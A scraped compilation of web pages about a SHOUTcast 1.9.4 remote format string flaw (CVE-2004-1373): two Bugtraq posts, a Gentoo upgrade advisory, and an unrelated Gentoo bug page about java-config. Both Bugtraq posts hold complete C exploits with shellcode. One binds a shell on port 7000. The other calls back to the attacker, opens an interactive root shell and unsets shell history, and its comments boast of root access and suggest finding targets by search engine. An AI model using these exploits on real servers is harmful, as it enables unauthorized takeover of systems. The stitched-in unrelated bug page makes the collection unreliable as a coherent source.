=== Content from marc.info_7298af7f_20250125_055310.html ===

```
[[prev in list](?l=bugtraq&m=110382462924162&w=2)] [[next in list](?l=bugtraq&m=110383187820887&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    SHOUTcast remote format string vulnerability
From:       [Damian Put <pucik () cc-team ! org>](?a=110382981900004&r=1&w=2)
Date:       [2004-12-23 18:24:04](?l=bugtraq&r=1&w=2&b=200412)
Message-ID: [20041223192404.0f322654.pucik () cc-team ! org](?i=20041223192404.0f322654.pucik%20()%20cc-team%20!%20org)
[Download RAW [message](?l=bugtraq&m=110382975516003&q=mbox) or [body](?l=bugtraq&m=110382975516003&q=raw)]

Product:    SHOUTcast v1.9.4 (and older?)
Vendor:     <http://www.shoutcast.com>
Vuln:       Remote format string
BugFinder:  Tomasz Trojanowski (onestep)
Author:     Damian Put <pucik@cc-team.org> [www.CC-Team.org](http://www.CC-Team.org)
Date:       Dec 23, 2004

1. BACKGROUND

"SHOUTcast is Nullsoft's Free Winamp-based distributed streaming audio
system. Thousands of broadcasters around the world are waiting for you to
tune in and listen"

2. DESCRIPTION

Remote exploitation of a format string vulnerability could allow execution
of arbitrary code.

A part of request, which was sent by attacker to server, would be included
in second arg of sprintf() function (0x0804adc3 in linux binary). It is
obviously not good from a security viewpoint. We can crash SHOUTcast in a
very easy way, using following request:

[http://host:8000/content/%n.mp3](http://host:8000/content/%25n.mp3)

Or reach remote shell thanks to attached exploit`s code.

3. CREDIT

Special thanks:
Tomasz Trojanowski for information about vulnerability

4. EXPLOIT

/* SHOUTcast DNAS/Linux v1.9.4 format string remote exploit           */
/* Damian Put <pucik@cc-team.org> Cyber-Crime Team ([www.CC-Team.org](http://www.CC-Team.org))  */
/* Tested on slackware 9.1 and 10.0 (0xbf3feee0)                      */
/* When exploit only crash SHOUTcast we should calculate new address: */
/*                                                                    */
/* bash-2.05b$ gdb sc_serv core                                       */
/* ...                                                                */
/* (gdb) x/x $edi                                                     */
/* 0xbe462270:     0x78257825                                         */
/* (gdb) x/x 0xbe462270-996                                           */
/* 0xbe461e8c:     0x5050c031                                         */
/*                                                                    */
/* 0xbe461e8c - This is our shellcode addr                            */
/*                                                                    */
/* Now we "only" must change format string code in req2 :-)           */

#include <stdio.h>
#include <stdlib.h>
#include <sys/errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

/* Default SHOUTcast port */
#define PORT 8000

char shellcode[] =  //bindshellcode (port 7000)
      "\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6"
      "\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50"
      "\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a"
      "\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31"
      "\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0"
      "\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80"
      "\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
      "\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
      int sock;
      char *host;
      struct hostent *h;
      struct sockaddr_in dest;

      char req1[1024] = "GET /content/AA"
      /* sprintf GOT addr */
      "\x3c\x49\x06\x08\x3d\x49\x06\x08\x3e\x49\x06\x08\x3f\x49\x06\x08";

      strcat(req1, shellcode);
      strcat(req1, ".mp3 HTTP/1.0\r\n\r\n");

      /* We cannot use %numberx and %number$n (filtered) */
      /* 0xbf3feee0 -  shellcode addr on slackware 9.1   */
      char *req2 = "GET /content/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n.mp3"
      " HTTP/1.0\r\n\r\n";

      printf("SHOUTcast DNAS/Linux v1.9.4 format string remote exploit by pucik [www.CC-Team.org\n](http://www.CC-Team.org\n)");
      if(argc < 2)
      {
            printf("Usage: %s <host>\n", argv[[0]](#0));
            exit(0);
      }

      host = argv[[1]](#1);

      if(!(h = gethostbyname(host)))
      {
            fprintf(stderr, "Cannot get IP of %s, %s!\n", host, strerror(errno));
            exit(-1);
      }

      sock = socket(PF_INET, SOCK_STREAM, 0);

      dest.sin_addr=*((struct in_addr*)h->h_addr);
      dest.sin_family = PF_INET;
      dest.sin_port = htons(PORT);

      if(connect(sock, (struct sockaddr*)&dest, sizeof(struct sockaddr)) == -1)
      {
            fprintf(stderr, "Cannot connect to %s, %s!\n", host, strerror(errno));
            exit(-1);
      }

      printf("[*] Sending first request ...\n");
      write(sock, req1, strlen(req1));

      close(sock);

      sock = socket(PF_INET, SOCK_STREAM, 0);

      if(connect(sock, (struct sockaddr*)&dest, sizeof(struct sockaddr)) == -1)
      {
            fprintf(stderr, "Cannot connect to %s, %s!\n", host, strerror(errno));
            exit(-1);
      }

      printf("[*] Sending second request ...\n");
      write(sock, req2, strlen(req2));

      close(sock);

      printf("[*] Try telnet %s 7000 :)\n", host);

      return 0;
}
[[prev in list](?l=bugtraq&m=110382462924162&w=2)] [[next in list](?l=bugtraq&m=110383187820887&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.gentoo.org_c52d436a_20250125_055342.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Shoutcast Server: Remote code execution — GLSA **200501-04**

Shoutcast Server contains a possible buffer overflow that could lead to the
execution of arbitrary code.

### Affected packages

| Package | **media-sound/shoutcast-server-bin** on all architectures |
| --- | --- |
| Affected versions | <= **1.9.4-r1** |
| Unaffected versions | >= **1.9.5** |

### Background

Shoutcast Server is Nullsoft's streaming audio server. It runs on a
variety of platforms, including Linux, and is extremely popular with
Internet broadcasters.

### Description

Part of the Shoutcast Server Linux binary has been found to improperly
handle sprintf() parsing.

### Impact

A malicious attacker could send a formatted URL request to the
Shoutcast Server. This formatted URL would cause either the server
process to crash, or the execution of arbitrary code.

### Workaround

There is no known workaround at this time.

### Resolution

All Shoutcast Server users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=media-sound/shoutcast-server-bin-1.9.5"
```
### References

* [BugTraq Announcement](http://www.securityfocus.com/archive/1/385350)
* [CVE-2004-1373](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1373)

**Release date**

January 05, 2005

**Latest revision**

May 22, 2006: 02

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [75482](https://bugs.gentoo.org/show_bug.cgi?id=75482)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from marc.info_584d144a_20250125_055342.html ===

```
[[prev in list](?l=bugtraq&m=110886869922397&w=2)] [[next in list](?l=bugtraq&m=110886378814713&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    exwormshoucast  part of PTjob project:  SHOUTcast v1.9.4 remote
From:       [yan feng <jsk () ph4nt0m ! net>](?a=105769447700002&r=1&w=2)
Date:       [2005-02-19 13:26:51](?l=bugtraq&r=1&w=2&b=200502)
Message-ID: [20050219132651.3909.qmail () www ! securityfocus ! com](?i=20050219132651.3909.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=110886444014745&q=mbox) or [body](?l=bugtraq&m=110886444014745&q=raw)]

/*           _ ________            _____                        ______
 *
 * exwormshoucast  part of PTjob project  SHOUTcast v1.9.4 remote exploit   / \  / \
                "fuck mm"
 * by jsk exworm (exworm.hostrocket.com)             \/
 * my home [www.ph4nt0m.org](http://www.ph4nt0m.org)
 * bug found by pucik_at_cc-team.org
 * test it in redhat 9.0 an fedora 1( use google :8000/listen.ls  maybe get some \
                ..hehe)
 * laji  chengxu  ....so pub it...
 * GT: emm.oyxin.seal.ava.haggis.b_root.more..
 * No girl No money  No jop...
 *[root@localhost home]# ./suck_shoutcast -h ***.***.***.***
 *SHOUTcast v1.9.4 remote exploit by exworm of 0seen
 *--------------------------------------------------(need money.to..fk..girl..)
 *[+] lisntener...
 *[*] Sending first request ...
 *[*] Sending second request ...
 *[+] ownedbyOseen!
 *-----------------------------------------------------------
 *Linux localhost.localdomain 2.4.22-1.2115.nptl #1 Wed Oct 29 15:42:51 EST 2003 i686 \
                i686 i386 GNU/Linux
 *uid=0(root) gid=0(root) \
                groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 *** oseen are chinese...
 *
 *
 *
 */

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <getopt.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <linux/sockios.h>

#define BUF 1024

char linux_connect_back[] =  /* connect back 45295 */
	"\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
	"\x06\x51\xb1\x01\x51\xb1\x02\x51"
	"\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
	"\x89\xc2\x31\xc0\x31\xc9\x51\x51"
	"\x68\xc0\xa8\x5a\x01\x66\x68\xb0"
	"\xef\xb1\x02\x66\x51\x89\xe7\xb3"
	"\x10\x53\x57\x52\x89\xe1\xb3\x03"
	"\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
	"\x74\x06\x31\xc0\xb0\x01\xcd\x80"
	"\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
	"\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
	"\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
	"\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
	"\x50\x68\x6e\x2f\x73\x68\x68\x2f"
	"\x2f\x62\x69\x89\xe3\x50\x53\x89"
	"\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
	"\x01\xcd\x80";
int sock;
void usage();
void shell();

void
usage(char *prog)
{

	 fprintf(stderr,"Usage: %s -t [-pah]\n",prog);
        fprintf(stderr,"-t version       Linux version.\n");
        fprintf(stderr,"-h target       The host to attack.\n");
	 fprintf(stderr,"-a devices     Default device is \"ppp0\".\n");
        fprintf(stderr,"-p port         Default port is 8000.\n\n");
}

int
openhost(char *host,int port)
{
        struct sockaddr_in addr;
        struct hostent *he;

        he=gethostbyname(host);

        if (he==NULL) return -1;
        sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
        if (sock==-1) return -1;

        memcpy(&addr.sin_addr, he->h_addr, he->h_length);

        addr.sin_family=AF_INET;
        addr.sin_port=htons(port);

        if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
        sock=-1;
        return sock;
}

void
shell(int sock)
{
        fd_set  fd_read;
        char buff[1024], *cmd="unset HISTFILE; /bin/uname -a;/usr/bin/id; echo '*** \
oseen are chinese...'\n";  int n;

        FD_ZERO(&fd_read);
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        send(sock, cmd, strlen(cmd), 0);

        while(1) {
                FD_SET(sock, &fd_read);
                FD_SET(0,    &fd_read);

                if (select(sock+1, &fd_read, NULL, NULL, NULL) < 0) break;

                if (FD_ISSET(sock, &fd_read)) {
                        if ((n = recv(sock, buff, sizeof(buff), 0)) < 0){
                                fprintf(stderr, "[+] EOF\n");
                                exit(2);
                        }

                        if (write(1, buff, n) <0) break;
                }

                if (FD_ISSET(0, &fd_read)) {
                        if ((n = read(0, buff, sizeof(buff))) < 0){
                                fprintf(stderr,"[+] EOF\n");
                                exit(2);
                        }

                        if (send(sock, buff, n, 0) < 0) break;
                }
        }

        fprintf(stderr,"[+] Connection lost.\n\n");
        exit(0);
}

unsigned char
*get_my_ip_addr(int sockfd, struct ifreq *ifr)
{
	struct sockaddr_in sin;
	char *b = (char *) malloc(4);

	if (ioctl(sockfd ,SIOCGIFADDR,ifr) < 0) {
                fprintf(stderr, "Unable to get the local IP Address, use -a.\n");
		exit(1);
        }

	memcpy(&sin, &ifr->ifr_addr, sizeof(struct sockaddr_in));
	memcpy(b, (char *) &sin.sin_addr.s_addr, 4);
	return b;
}

int
main (int argc,char *argv[])
{
        char buf1[512];
        char buf2[512];
        char host[256];
        char pass[256]="changeme";
        char data;

        int  type= 0;
        int c=0;
        int port=8001;
        char devices[256] = "ppp0";
	unsigned char *ptr;

        struct hostent *hp;
        struct sockaddr_in sin_listener;
	struct ifreq ifr;
        struct timeval timeout;

        fd_set fdread;

	int delay	= 12;
        int i           = 0;
	int mode	= 0;
	int local_port	= 0;
        int opt         = 0;
        int ret 	= 0;
	int sin_len 	= sizeof (struct sockaddr_in);
        int sock        = 0;
	int sock2	= 0;
	int sockd	= 0;
        int listener	= 0;
	int time_out	= 4;
	int tmp		= 0;

        srand(getpid());

        fprintf(stdout,"SHOUTcast v1.9.4 remote exploit by exworm of 0seen\n");
        fprintf(stdout,"--------------------------------------------------([www.oseen.org](http://www.oseen.org))\n");

        while((c=getopt(argc,argv,"h:p:a:t:")) !=EOF)
        {
                switch(c)
                {
                        case 'p':
                                port=atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr,"Invalid port.\n\n");
                                        exit(1);
                                }
                                break;
                        case 'a':
                                memset(devices,0x0,sizeof(devices));
                                strncpy(devices,optarg,sizeof(devices) - 1);
                                break;
                        case 't':
                                type = atoi(optarg);
                                if (type == 0 || type > sizeof(targets) / 28) {
                                        for(i = 0; i < sizeof(targets) / 28; i++)
                                        fprintf(stderr, "%02d. %s - %s      [0x%08x - \
                0x%08x]\n",
                                                i + 1, targets[i].distro, \
targets[i].type, targets[i].ret, targets[i].eax);  return -1;
                                }
                                break;
                        case 'h':
                                memset(host,0x0,sizeof(host));
                                strncpy(host,optarg,sizeof(host) - 1);
                                break;

                        default:
                                usage(argv[[0]](#0));
                                exit(1);
                                break;
                }
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;

        if (strlen(host) == 0) {
                usage(argv[[0]](#0));
                exit(1);
        }
        sock=openhost(host, port);

        if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

	strncpy(ifr.ifr_name, devices, 15);

        if ((sockd = socket(AF_INET, SOCK_DGRAM, 17)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

        if ((listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

	ptr = get_my_ip_addr(sockd, &ifr);
       memcpy(&sin_listener.sin_addr.s_addr, ptr, 4);

        sin_listener.sin_family = AF_INET;
	memset(&sin_listener.sin_zero, 0x00, 8);

        while(1) {
                local_port = local_port = 45295;
                sin_listener.sin_port = htons(local_port);
                if (!bind(listener, (struct sockaddr *) &sin_listener, sin_len)) \
break;  }

	listen(listener, 1);
        fprintf(stdout, "[+] lisntener...\n");

        linux_connect_back[129] = (unsigned int) *(ptr + 0);
        linux_connect_back[130] = (unsigned int) *(ptr + 1);
        linux_connect_back[131] = (unsigned int) *(ptr + 2);
        linux_connect_back[132] = (unsigned int) *(ptr + 3);

      char req[1024] = "GET /content/DD"
"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"

"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD";

     strcat(req, "DD.mp3 HTTP/1.0\r\n\r\n");

      char req1[1024] = "GET /content/AA"
      /* sprintf GOT addr */
      "\x3c\x49\x06\x08\x3d\x49\x06\x08\x3e\x49\x06\x08\x3f\x49\x06\x08";

      strcat(req1, linux_connect_back);
      strcat(req1, ".mp3 HTTP/1.0\r\n\r\n");

      char *req2 = "GET \
/content/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"  \
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAA"
  "AAAAAAAAAAAAAAA-%n-"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n.mp3"
      " /HTTP/1.0\r\n\r\n";

      printf("[*] Sending first request ...\n");
      write(sock, req1, strlen(req1));

      close(sock);
      sock=openhost(host, 8000);
              if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

      printf("[*] Sending second request ...\n");

        while(1) {
                write(sock, req2, strlen(req2));
                sleep(2);
                FD_ZERO(&fdread);
        	FD_SET(listener, &fdread);

	        timeout.tv_sec = time_out;
	        timeout.tv_usec = 0;

	        while(1) {

        	        ret = select(FD_SETSIZE, &fdread, NULL, NULL, &timeout);

	                if (ret < 0) {
	                        close(sock);
        	                close(listener);
	                        fprintf(stderr, "select() error.\n");
        	                return -1;
	                }

                	if (ret == 0) {
				fprintf(stderr, "[+] Failed, waiting %d seconds.\n"
						"[+] Use ctrl-c to abort.\n", delay);
				sleep(delay);
				break;
	                }

        	        if(FD_ISSET(listener, &fdread)) {
				sock2 = accept(listener, (struct sockaddr *)&sin_listener, &sin_len);
				close(sock);
				close(listener);

			        fprintf(stderr, "[+] ownedbyOseen!\n"
						"-----------------------------------------------------------\n");
	                        shell(sock2);
				close(sock2);
				return 0;
			}
		}

	}

	fprintf(stderr, "[+] Exploit failed.\n");
	close(listener);
	close(sock);
	return 0;

}

[[prev in list](?l=bugtraq&m=110886869922397&w=2)] [[next in list](?l=bugtraq&m=110886378814713&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from bugs.gentoo.org_cbeb90c2_20250126_062812.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 754
java-config should be able to switch between available JDKs and JREs
Last modified: 2003-02-04 19:42:18 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=754&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=754&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 754**](show_bug.cgi?id=754)
- java-config should be able to switch between available JDKs and JREs

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
java-config should be able to switch between available JDKs and JREs

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Linux | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Linux "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | [OLD] Core system ([show other bugs](buglist.cgi?component=%5BOLD%5D%20Core%20system&product=Gentoo%20Linux&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | x86 Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | High critical | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Karl Trygve Kalleberg (RETIRED) | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2002-02-18 14:00 UTC by Karl Trygve Kalleberg (RETIRED) | | --- | --- | | Modified: | 2003-02-04 19:42 UTC ([History](show_activity.cgi?id=754)) | | CC List: | 0 users | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=754&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=754&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Karl Trygve Kalleberg (RETIRED)   gentoo-dev  2002-02-18 14:00:39 UTC  ``` This should also be supported in 21jdk and 20jre. ```  [Comment 1](#c1)  Karl Trygve Kalleberg (RETIRED)   gentoo-dev  2002-03-08 17:25:31 UTC  ``` Use .gentoo/javaenv would solve the problem of having to be root when switching between JDKs.   We need to add support for java-config to list available JDKs, and switch between them either as user-default or system-default. ```  [Comment 2](#c2)  Karl Trygve Kalleberg (RETIRED)   gentoo-dev  2002-03-18 15:46:26 UTC  ``` Install a new VM and look at the java-config man page. ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=754)
* - [XML](show_bug.cgi?ctype=xml&id=754)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=754)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=754&product=Gentoo%20Linux)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=754&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=754&GoAheadAndLogIn=1#forgot)
    Login:

    [x]


